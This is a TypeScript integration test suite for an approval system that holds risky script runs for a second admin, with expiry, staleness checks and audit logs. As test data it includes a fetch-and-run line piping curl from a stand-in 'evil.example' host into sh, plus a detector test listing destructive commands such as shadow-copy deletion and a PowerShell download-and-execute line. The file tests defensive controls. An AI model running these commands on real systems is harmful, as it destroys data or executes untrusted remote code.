/**
 * Approval for risky runs: dangerous snippets/runbooks and large runs wait
 * for an admin (never the requester), expire, notify, and are audit-logged,
 * for manual and scheduled runs.
 * Needs TEST_DATABASE_URL (a throwaway database whose name contains "test").
 */
import { describe, test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'http';
import { AddressInfo } from 'net';

const TEST_DATABASE_URL = process.env.TEST_DATABASE_URL || '';
const skip = TEST_DATABASE_URL ? false : 'TEST_DATABASE_URL is not set, skipping approval tests';

interface TestResponse {
  status: number;
  text: string;
  headers: http.IncomingHttpHeaders;
  json: () => any;
}

describe('run approvals', { skip }, () => {
  let server: http.Server;
  let port = 0;
  let db: any;
  let models: typeof import('../src/models');
  const cookies: { [who: string]: string } = {};

  const request = (
    method: string,
    path: string,
    options: { body?: unknown; form?: Record<string, string>; as?: string | null; ip?: string } = {}
  ): Promise<TestResponse> =>
    new Promise((resolve, reject) => {
      const headers: http.OutgoingHttpHeaders = {};
      let payload: string | undefined;

      if (options.form) {
        payload = new URLSearchParams(options.form).toString();
        headers['content-type'] = 'application/x-www-form-urlencoded';
      } else if (options.body !== undefined) {
        payload = JSON.stringify(options.body);
        headers['content-type'] = 'application/json';
      }
      if (payload !== undefined) headers['content-length'] = Buffer.byteLength(payload);

      const who = options.as === undefined ? 'owner' : options.as;
      if (who && cookies[who]) { headers.cookie = `${cookies[who]}; XSRF-TOKEN=test-xsrf`; headers['x-xsrf-token'] = 'test-xsrf'; }
      if (options.ip) headers['x-forwarded-for'] = options.ip;

      const req = http.request({ host: '127.0.0.1', port, method, path, headers, agent: false }, res => {
        const chunks: Buffer[] = [];
        res.on('data', chunk => chunks.push(chunk));
        res.on('end', () => {
          const text = Buffer.concat(chunks).toString('utf8');
          resolve({ status: res.statusCode || 0, text, headers: res.headers, json: () => JSON.parse(text) });
        });
      });
      req.on('error', reject);
      if (payload !== undefined) req.write(payload);
      req.end();
    });

  const ok = async (res: Promise<TestResponse>, status = 200) => {
    const response = await res;
    assert.equal(response.status, status, response.text);
    return response.json().data;
  };

  let site: { id: number };
  let safe: { id: number };
  let risky: { id: number };
  let scheduler: typeof import('../src/utils/scheduler');
  let approvals: typeof import('../src/utils/approvals');
  const devices: any[] = [];

  const jobs = () => models.AgentJobModel.count();
  const audits = async (action: string) => models.AuditLogModel.count({ where: { action } });

  before(async () => {
    const dbName = new URL(TEST_DATABASE_URL).pathname.replace(/^\//, '');
    if (!/test/i.test(dbName)) throw new Error(`Refusing to reset database "${dbName}"`);

    process.env.DATABASE_URL = TEST_DATABASE_URL;
    process.env.NODE_ENV = 'test';
    process.env.SESSION_SECRET = 'snippycode-test-session-secret';
    process.env.VARIABLES_SECRET_KEY = 'snippycode-test-variables-key';

    await import('../src/utils');
    db = await import('../src/db');
    await db.sequelize.query('DROP SCHEMA IF EXISTS public CASCADE; CREATE SCHEMA public;');
    await db.connectDB();
    const { associateModels } = await import('../src/db/associateModels');
    await associateModels();
    models = await import('../src/models');
    scheduler = await import('../src/utils/scheduler');
    approvals = await import('../src/utils/approvals');

    const { createApp } = await import('../src/app');
    server = createApp({ clientDirs: [] }).listen(0, '127.0.0.1');
    await new Promise(resolve => server.once('listening', resolve));
    port = (server.address() as AddressInfo).port;

    const setup = await request('POST', '/api/auth/setup', {
      body: { email: 'owner@example.test', displayName: 'Owner', password: 'correct-horse-battery' },
      as: null
    });
    assert.equal(setup.status, 201, setup.text);
    cookies.owner = String(setup.headers['set-cookie']?.[0] || '').split(';')[0];

    site = await ok(request('POST', '/api/sites', { body: { name: 'Alpha', access: 'members' } }), 201);
    const memberIds: number[] = [];
    for (const [who, role] of [['alice', 'editor'], ['adam', 'admin']]) {
      const user = await ok(
        request('POST', '/api/admin/users', {
          body: { email: `${who}@example.test`, displayName: who, password: `${who}-password-123`, role }
        }),
        201
      );
      memberIds.push(user.id);
      const login = await request('POST', '/api/auth/login', {
        body: { email: `${who}@example.test`, password: `${who}-password-123` },
        as: null
      });
      cookies[who] = String(login.headers['set-cookie']?.[0] || '').split(';')[0];
    }
    await ok(request('PUT', `/api/sites/${site.id}/members`, { body: { userIds: memberIds } }));

    const snippet = (title: string) =>
      ok(request('POST', '/api/snippets', { body: { title, language: 'bash', code: 'uptime\n', description: '', docs: '', tags: [], isPinned: false } }), 201);
    safe = await snippet('Uptime');
    risky = await snippet('Wipe temp');
    for (let i = 0; i < 4; i += 1) {
      devices.push(
        await models.DeviceModel.create({
          siteId: site.id, name: `d${i}`, hostname: `d${i}`, os: 'linux', arch: 'x86_64', capabilities: 'bash',
          tokenHash: `unused-${i}`, tokenPrefix: `dev_appr_${i}`, lastSeenAt: new Date()
        } as any)
      );
    }
  });

  after(async () => {
    await new Promise(resolve => server?.close(resolve));
    await db?.sequelize.close();
  });

  const runOn = (snippetId: number, count: number, as = 'alice', extra: Record<string, unknown> = {}) =>
    request('POST', `/api/snippets/${snippetId}/run`, {
      body: { siteId: site.id, deviceIds: devices.slice(0, count).map(d => d.id), reason: 'clear space', ...extra },
      as
    });

  test('settings: defaults, admin-only, audited', async () => {
    assert.deepEqual(await ok(request('GET', '/api/approvals/settings')), { enabled: true, deviceThreshold: 10, expiryHours: 24 });
    assert.equal((await request('PUT', '/api/approvals/settings', { body: { deviceThreshold: 2 }, as: 'alice' })).status, 403);
    const saved = await ok(request('PUT', '/api/approvals/settings', { body: { deviceThreshold: 2, expiryHours: 9999 } }));
    assert.equal(saved.deviceThreshold, 2);
    assert.equal(saved.expiryHours, 336, 'clamped to 14 days');
    await ok(request('PUT', '/api/approvals/settings', { body: { expiryHours: 24 } }));
    assert.equal(await audits('approval.settings_changed'), 2);
  });

  test('dangerous flag: editors set it, only admins clear it, edits keep it', async () => {
    await ok(request('PUT', `/api/snippets/${risky.id}/dangerous`, { body: { dangerous: true }, as: 'alice' }));
    assert.equal((await request('PUT', `/api/snippets/${risky.id}/dangerous`, { body: { dangerous: false }, as: 'alice' })).status, 403);
    await ok(request('PUT', `/api/snippets/${risky.id}`, {
      body: { title: 'Wipe temp', language: 'bash', code: 'rm -rf /tmp/x\n', description: '', docs: '', dangerous: false, isPinned: false },
      as: 'alice'
    }));
    assert.equal((await models.SnippetModel.findByPk(risky.id))!.dangerous, true);
    assert.equal(await audits('snippet.flagged_dangerous'), 1);
  });

  test('small safe runs go straight through', async () => {
    const before = await jobs();
    const res = await runOn(safe.id, 2);
    assert.equal(res.status, 202, res.text);
    assert.ok(res.json().data.jobs);
    assert.equal(await jobs(), before + 2);
  });

  test('a dangerous run waits, the requester cannot approve, another admin can', async () => {
    const before = await jobs();
    const held = await ok(runOn(risky.id, 1, 'alice', { approvedRun: 1 }), 202);
    assert.ok(held.approval, 'a body flag cannot skip approval');
    assert.deepEqual(held.approval.why, ['dangerous']);
    assert.equal(held.approval.reason, 'clear space');
    assert.equal(held.approval.targets[0].name, 'd0');
    assert.equal(held.approval.payload, undefined, 'the held request is never shown');
    assert.equal(await jobs(), before, 'nothing queued yet');

    assert.equal((await request('POST', `/api/approvals/${held.approval.id}/approve`, { as: 'alice' })).status, 403);
    const pending = await ok(request('GET', '/api/approvals', { as: 'alice' }));
    assert.equal(pending.length, 1, 'requesters see their own requests');
    assert.equal(pending[0].canDecide, false);
    assert.equal((await ok(request('GET', '/api/approvals/count'))).pending, 1);

    const approved = await ok(request('POST', `/api/approvals/${held.approval.id}/approve`, { body: { comment: 'ok, checked' } }));
    assert.equal(approved.status, 'approved');
    assert.equal(approved.decisionComment, 'ok, checked');
    assert.match(approved.result, /Queued on 1 device/);
    assert.equal(await jobs(), before + 1);
    const job = await models.AgentJobModel.findOne({ order: [['id', 'DESC']] });
    assert.equal(job!.deviceId, devices[0].id);

    assert.equal((await request('POST', `/api/approvals/${held.approval.id}/approve`)).status, 409, 'only once');
    assert.equal((await models.RunApprovalModel.findByPk(held.approval.id))!.payload, '', 'payload dropped after use');
    for (const action of ['approval.requested', 'approval.approved', 'approval.executed']) {
      assert.ok((await audits(action)) >= 1, action);
    }
  });

  test('admins cannot approve their own runs', async () => {
    const held = await ok(runOn(risky.id, 1, 'adam'), 202);
    assert.equal((await request('POST', `/api/approvals/${held.approval.id}/approve`, { as: 'adam' })).status, 403);
    const denied = await ok(request('POST', `/api/approvals/${held.approval.id}/deny`, { body: { comment: 'not today' } }));
    assert.equal(denied.status, 'denied');
    assert.equal(denied.decisionComment, 'not today');
  });

  test('large runs above the threshold wait, at or below it do not', async () => {
    await ok(request('PUT', '/api/approvals/settings', { body: { deviceThreshold: 3 } }));
    assert.ok((await runOn(safe.id, 3)).json().data.jobs);
    const held = await ok(runOn(safe.id, 4), 202);
    assert.deepEqual(held.approval.why, ['large']);
    assert.equal(held.approval.targetCount, 4);
    await ok(request('POST', `/api/approvals/${held.approval.id}/deny`));
    await ok(request('PUT', '/api/approvals/settings', { body: { deviceThreshold: 10 } }));
  });

  test('pending approvals expire and can no longer be approved', async () => {
    const held = await ok(runOn(risky.id, 1), 202);
    await models.RunApprovalModel.update({ expiresAt: new Date(Date.now() - 1000) }, { where: { id: held.approval.id } });
    assert.equal((await request('POST', `/api/approvals/${held.approval.id}/approve`)).status, 409);
    const row = await models.RunApprovalModel.findByPk(held.approval.id);
    assert.equal(row!.status, 'expired');
    assert.ok((await audits('approval.expired')) >= 1);
    const history = await ok(request('GET', '/api/approvals?status=history'));
    assert.ok(history.some((item: any) => item.id === held.approval.id && item.status === 'expired'));
  });

  test('dangerous runbooks (flagged or containing a dangerous snippet) wait', async () => {
    const runbook = await ok(request('POST', '/api/runbooks', { body: { title: 'Cleanup', steps: [{ snippetId: risky.id, title: 'wipe', note: '' }] } }), 201);
    const held = await ok(request('POST', `/api/runbooks/${runbook.id}/runs`, { body: { siteId: site.id }, as: 'alice' }), 202);
    assert.equal(held.approval.kind, 'runbook');
    const approved = await ok(request('POST', `/api/approvals/${held.approval.id}/approve`));
    assert.match(approved.result, /Runbook run #\d+ started/);
    assert.equal(await models.RunbookRunModel.count({ where: { runbookId: runbook.id } }), 1);

    const plain = await ok(request('POST', '/api/runbooks', { body: { title: 'Plain', steps: [{ snippetId: safe.id, title: 'up', note: '' }] } }), 201);
    assert.equal((await request('POST', `/api/runbooks/${plain.id}/runs`, { body: { siteId: site.id }, as: 'alice' })).status, 201);
    await ok(request('PUT', `/api/runbooks/${plain.id}/dangerous`, { body: { dangerous: true }, as: 'alice' }));
    assert.equal((await request('PUT', `/api/runbooks/${plain.id}/dangerous`, { body: { dangerous: false }, as: 'alice' })).status, 403);
    assert.equal((await request('POST', `/api/runbooks/${plain.id}/runs`, { body: { siteId: site.id }, as: 'alice' })).status, 202);
  });

  test('scheduled runs wait too, without piling up, and resume once approved', async () => {
    const schedule = await ok(
      request('POST', '/api/schedules', {
        body: { name: 'Nightly wipe', cron: '0 3 * * *', timezone: 'UTC', targetType: 'snippet', enabled: true, snippetId: risky.id, siteMode: 'devices', deviceIds: [devices[0].id, devices[1].id] },
        as: 'alice'
      }),
      201
    );
    const row = await models.ScheduleModel.findByPk(schedule.id);
    const before = await jobs();
    const first = await scheduler.startScheduleRun(row!, 'schedule');
    assert.equal((await first.reload()).status, 'awaiting_approval');
    const approval = await models.RunApprovalModel.findOne({ where: { scheduleId: schedule.id, status: 'pending' } });
    assert.ok(approval);
    assert.equal(approval!.trigger, 'schedule');

    const second = await scheduler.startScheduleRun(row!, 'schedule');
    assert.equal((await second.reload()).status, 'failed', 'a later tick does not pile up another request');
    assert.equal(await models.RunApprovalModel.count({ where: { scheduleId: schedule.id } }), 1);
    assert.equal(await jobs(), before);

    // alice created the schedule, so she cannot approve it; adam can
    assert.equal((await request('POST', `/api/approvals/${approval!.id}/approve`, { as: 'alice' })).status, 403);
    await ok(request('POST', `/api/approvals/${approval!.id}/approve`, { as: 'adam' }));
    assert.equal(await jobs(), before + 2);
    assert.notEqual((await first.reload()).status, 'awaiting_approval');

    // Denied scheduled runs are closed as failed
    const third = await scheduler.startScheduleRun(row!, 'manual');
    const next = await models.RunApprovalModel.findOne({ where: { scheduleRunId: third.id } });
    await ok(request('POST', `/api/approvals/${next!.id}/deny`, { as: 'adam' }));
    assert.equal((await third.reload()).status, 'failed');
  });

  test('approvers are notified through webhooks', async () => {
    const { NOTIFICATION_EVENTS } = await import('../src/utils/notify');
    assert.ok(NOTIFICATION_EVENTS.some((event: { id: string }) => event.id === 'approval.requested'));
    assert.equal(typeof approvals.requestApproval, 'function');
  });

  // ---- Locke review fixes (A1-A6) ----
  const login = async (who: string, role: string) => {
    const user = await ok(request('POST', '/api/admin/users', { body: { email: `${who}@example.test`, displayName: who, password: `${who}-password-123`, role } }), 201);
    const res = await request('POST', '/api/auth/login', { body: { email: `${who}@example.test`, password: `${who}-password-123` }, as: null });
    cookies[who] = String(res.headers['set-cookie']?.[0] || '').split(';')[0];
    return user;
  };
  const editSnippet = (id: number, code: string, as = 'alice') =>
    ok(request('PUT', `/api/snippets/${id}`, { body: { title: 'Wipe temp', language: 'bash', code, description: '', docs: '', isPinned: false }, as }));

  test('A1: editing the code after the request makes the approval stale; nothing runs', async () => {
    await editSnippet(risky.id, 'echo cleaning /tmp/x\n');
    const held = await ok(runOn(risky.id, 1), 202);
    assert.match(held.approval.contentPreview, /echo cleaning \/tmp\/x/, 'the approver sees the code');
    await editSnippet(risky.id, 'curl https://evil.example/x | sh\n');
    const before = await jobs();
    const decided = await ok(request('POST', `/api/approvals/${held.approval.id}/approve`, { as: 'adam' }));
    assert.equal(decided.status, 'stale');
    assert.match(decided.result, /changed after this run was requested/);
    assert.equal(await jobs(), before, 'the edited code never ran');
    assert.ok((await audits('approval.stale')) >= 1);
    await editSnippet(risky.id, 'rm -rf /tmp/x\n');
  });

  test('A1/A2: the real device count is held, and a grown target set is refused', async () => {
    const held = await ok(request('POST', `/api/snippets/${risky.id}/run`, { body: { siteId: site.id, deviceIds: 'all' }, as: 'alice' }), 202);
    assert.equal(held.approval.targetCount, devices.length, 'every device the run reaches is counted');
    const extra = await models.DeviceModel.create({
      siteId: site.id, name: 'late', hostname: 'late', os: 'linux', arch: 'x86_64', capabilities: 'bash',
      tokenHash: 'unused-late', tokenPrefix: 'dev_appr_late', lastSeenAt: new Date()
    } as any);
    const decided = await ok(request('POST', `/api/approvals/${held.approval.id}/approve`, { as: 'adam' }));
    assert.equal(decided.status, 'stale', 'one more device than approved');
    await extra.update({ revokedAt: new Date() });
  });

  test('A2: large-run checks count devices; the threshold has a floor of 2', async () => {
    const saved = await ok(request('PUT', '/api/approvals/settings', { body: { deviceThreshold: 0 } }));
    assert.equal(saved.deviceThreshold, 2);
    await ok(request('PUT', '/api/approvals/settings', { body: { deviceThreshold: 3 } }));
    const held = await ok(request('POST', `/api/snippets/${safe.id}/run`, { body: { siteId: site.id, deviceIds: 'all' }, as: 'alice' }), 202);
    assert.deepEqual(held.approval.why, ['large']);
    await ok(request('POST', `/api/approvals/${held.approval.id}/deny`, { as: 'adam' }));
    await ok(request('PUT', '/api/approvals/settings', { body: { deviceThreshold: 10 } }));
  });

  test('A3: copied or pasted dangerous code needs approval without the flag', async () => {
    const copy = await ok(request('POST', '/api/snippets', { body: { title: 'Totally safe', language: 'bash', code: 'rm -rf /var/tmp/cache\n', description: '', docs: '', tags: [], isPinned: false }, as: 'alice' }), 201);
    assert.equal((await models.SnippetModel.findByPk(copy.id))!.dangerous, false);
    const held = await ok(runOn(copy.id, 1), 202);
    assert.deepEqual(held.approval.why, ['dangerous']);
    assert.match(held.approval.contentPreview, /Matched rules: recursive delete/);
    await ok(request('POST', `/api/approvals/${held.approval.id}/deny`, { as: 'adam' }));
    const { dangerousContent } = await import('../src/utils/dangerousContent');
    assert.deepEqual(dangerousContent('uptime\ndf -h\n'), []);
    for (const code of ['Remove-Item C:\\x -Recurse -Force', 'diskpart /s wipe.txt', 'reg delete HKLM\\Software\\X /f', 'vssadmin delete shadows /all', 'iex (New-Object Net.WebClient).DownloadString("http://x")']) {
      assert.ok(dangerousContent(code).length, code);
    }
  });

  test('A4: scheduled runs are requested by the last editor; neither owner nor editor may approve', async () => {
    const schedule = await ok(request('POST', '/api/schedules', {
      body: { name: 'Edited wipe', cron: '0 4 * * *', timezone: 'UTC', targetType: 'snippet', enabled: true, snippetId: risky.id, siteMode: 'devices', deviceIds: [devices[2].id] },
      as: 'alice'
    }), 201);
    const current = await ok(request('GET', `/api/schedules/${schedule.id}`, { as: 'adam' }));
    await ok(request('PUT', `/api/schedules/${schedule.id}`, { body: { ...current, name: 'Edited wipe (adam)' }, as: 'adam' }));
    const row = await models.ScheduleModel.findByPk(schedule.id);
    assert.ok(row!.updatedBy);
    const run = await scheduler.startScheduleRun(row!, 'schedule');
    const approval = await models.RunApprovalModel.findOne({ where: { scheduleRunId: run.id } });
    assert.equal(approval!.requestedBy, row!.updatedBy, 'the last editor is the requester');
    assert.equal((await request('POST', `/api/approvals/${approval!.id}/approve`, { as: 'adam' })).status, 403, 'last editor');
    assert.equal((await request('POST', `/api/approvals/${approval!.id}/approve`, { as: 'alice' })).status, 403, 'owner');
    const decided = await ok(request('POST', `/api/approvals/${approval!.id}/approve`));
    assert.equal(decided.status, 'approved');
  });

  test('A1: a schedule edited while waiting is refused at approval', async () => {
    const schedule = await ok(request('POST', '/api/schedules', {
      body: { name: 'Stale wipe', cron: '0 5 * * *', timezone: 'UTC', targetType: 'snippet', enabled: true, snippetId: risky.id, siteMode: 'devices', deviceIds: [devices[3].id] },
      as: 'alice'
    }), 201);
    const run = await scheduler.startScheduleRun((await models.ScheduleModel.findByPk(schedule.id))!, 'schedule');
    const approval = await models.RunApprovalModel.findOne({ where: { scheduleRunId: run.id } });
    const current = await ok(request('GET', `/api/schedules/${schedule.id}`, { as: 'alice' }));
    await ok(request('PUT', `/api/schedules/${schedule.id}`, { body: { ...current, deviceIds: [devices[0].id, devices[3].id] }, as: 'alice' }));
    const before = await jobs();
    // The stored payload is bound to its row (enc:v2 with AAD)
    assert.match(String(approval!.payload), /^enc:v2:/);
    const decided = await ok(request('POST', `/api/approvals/${approval!.id}/approve`, { as: 'adam' }));
    assert.equal(decided.status, 'stale');
    assert.equal(await jobs(), before);
    // The schedule run that waited for it is closed as failed, not left running
    assert.equal((await models.ScheduleRunModel.findByPk(run.id))?.status, 'failed');
  });

  test('approval payloads are bound to their row; a payload moved to another row is unreadable', async () => {
    const utils = await import('../src/utils/approvals');
    const box = await import('../src/utils/secretBox');
    const payload = box.encryptSecret(JSON.stringify({ variables: { A: '1' } }), 'run_approvals:41:payload');
    assert.deepEqual(utils.approvalPayload({ id: 41, payload } as any), { variables: { A: '1' } });
    assert.deepEqual(utils.approvalPayload({ id: 42, payload } as any), {});
    // Older v1 payloads still read
    assert.deepEqual(utils.approvalPayload({ id: 7, payload: box.encryptSecret('{"x":1}') } as any), { x: 1 });
  });

  test('A5: only the owner can change approval settings; refusals and changes are audited', async () => {
    const refused = await request('PUT', '/api/approvals/settings', { body: { enabled: false }, as: 'adam' });
    assert.equal(refused.status, 403);
    assert.equal((await ok(request('GET', '/api/approvals/settings'))).enabled, true);
    assert.ok((await audits('approval.settings_refused')) >= 1);
    await ok(request('PUT', '/api/approvals/settings', { body: { enabled: false } }));
    await ok(request('PUT', '/api/approvals/settings', { body: { enabled: true } }));
  });

  test('A6: site admins approve only for their own sites; plain members never', async () => {
    const sam = await login('sam', 'editor');
    await login('eve', 'editor');
    const members = await models.SiteMemberModel.findAll({ where: { siteId: site.id } });
    const userIds = Array.from(new Set([...members.map((m: any) => m.userId), sam.id]));
    await ok(request('PUT', `/api/sites/${site.id}/members`, { body: { userIds, adminIds: [sam.id] } }));
    const held = await ok(runOn(risky.id, 1), 202);
    assert.equal((await request('POST', `/api/approvals/${held.approval.id}/approve`, { as: 'eve' })).status, 403);
    const listed = await ok(request('GET', '/api/approvals', { as: 'sam' }));
    assert.ok(listed.some((item: any) => item.id === held.approval.id && item.canDecide));
    assert.equal((await ok(request('POST', `/api/approvals/${held.approval.id}/approve`, { as: 'sam' }))).status, 'approved');

    const beta = await ok(request('POST', '/api/sites', { body: { name: 'Beta' } }), 201);
    const other = await models.DeviceModel.create({
      siteId: beta.id, name: 'b0', hostname: 'b0', os: 'linux', arch: 'x86_64', capabilities: 'bash',
      tokenHash: 'unused-b0', tokenPrefix: 'dev_appr_b0', lastSeenAt: new Date()
    } as any);
    const elsewhere = await ok(request('POST', `/api/snippets/${risky.id}/run`, { body: { siteId: beta.id, deviceIds: [other.id] }, as: 'alice' }), 202);
    assert.equal((await request('POST', `/api/approvals/${elsewhere.approval.id}/approve`, { as: 'sam' })).status, 403, 'not their site');
    const mine = (await ok(request('GET', '/api/approvals', { as: 'sam' }))).filter((item: any) => item.canDecide);
    assert.ok(!mine.some((item: any) => item.id === elsewhere.approval.id), 'Beta requests are not offered to sam');
    assert.equal((await ok(request('GET', '/api/approvals/count', { as: 'sam' }))).pending, mine.length);
    await ok(request('POST', `/api/approvals/${elsewhere.approval.id}/deny`, { as: 'adam' }));
  });
});
